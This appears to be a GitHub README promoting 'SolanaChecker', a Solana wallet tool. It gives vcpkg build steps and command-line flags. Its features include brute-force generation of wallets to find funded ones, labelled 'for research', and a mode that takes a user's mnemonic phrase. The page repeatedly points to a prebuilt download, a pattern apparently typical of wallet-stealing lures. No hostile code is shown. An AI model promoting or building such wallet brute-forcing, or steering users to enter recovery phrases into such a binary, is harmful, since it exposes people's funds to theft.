# Solana Blockchain Explorer: Unveiling the Solana Network with SolanaChecker

**SolanaChecker** is your versatile tool for exploring the Solana blockchain. It provides a range of features to help you understand and interact with the Solana network. With tools for checking balances, analyzing tokens, and monitoring activity, SolanaChecker simplifies the process of interacting with the blockchain, acting as a personal Solana blockchain explorer.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/files/options.webp" />
</p>

## Program Features: Exploring the Solana Ecosystem

1.  **Check Solana Address Balance:** Easily track funds.

<p align="left">
    <img src="/files/resize.webp" />
</p>

2.  **Check Solana Tokens for Fraud:** Analyze token security.

<p align="left">
    <img src="/files/bottom.webp" />
</p>

3.  **Track Solana Addresses:** Monitor activity.

4.  **Wallet Data from Mnemonic Phrase:** Access wallet information.

<p align="left">
    <img src="/files/see.webp" />
</p>

5.  **Generate a Single Solana Wallet:** Generate new wallets.

<p align="left">
    <img src="/files/page.webp" />
</p>

6.  **Generation Solana Wallets and Check Balance (for Research):** Brute-force.

<p align="left">
    <img src="/files/array.webp" />
</p>

## Setting Up Telegram (for Real-Time Information)

Configure Telegram.

## Getting Started: Download or Build

Download a pre-compiled build or build the project yourself.

## Building the Project: Transparency and Customization

Building ensures you have control.

### Installing Dependencies Using vcpkg:

1.  Install **vcpkg** if you don't have it.
2.  Add vcpkg to your system PATH.
3.  Run these commands:

    -   Install **OpenSSL**:
        ```bash
        vcpkg install openssl
        ```

    -   Install **nlohmann-json**:
        ```bash
        vcpkg install nlohmann-json
        ```

    -   Install **Crypto++**:
        ```bash
        vcpkg install cryptopp
        ```

    -   Install **libsodium**:
        ```bash
        vcpkg install libsodium
        ```

4.  Build the project.

### Building via Visual Studio:

1.  Open the project solution in Visual Studio.
2.  Ensure **vcpkg** is integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable is in the `bin` folder.

### Building with Another C++ Compiler:

1.  Ensure that all dependencies are installed via **vcpkg**.
2.  Compile using (example):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line: Your Solana Exploration Toolkit

Use the command line:

1.  **-s / -search**: Brute-force (for research).
2.  **-t / -track (ADDRESS)**: Track an address.
3.  **-g / -gen (NUMBER)**: Generate wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Show wallet info.
5.  **-b / -balance (ADDRESS)**: Check the balance.

## Notes

-   Use responsibly.
-   Protect your data.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE).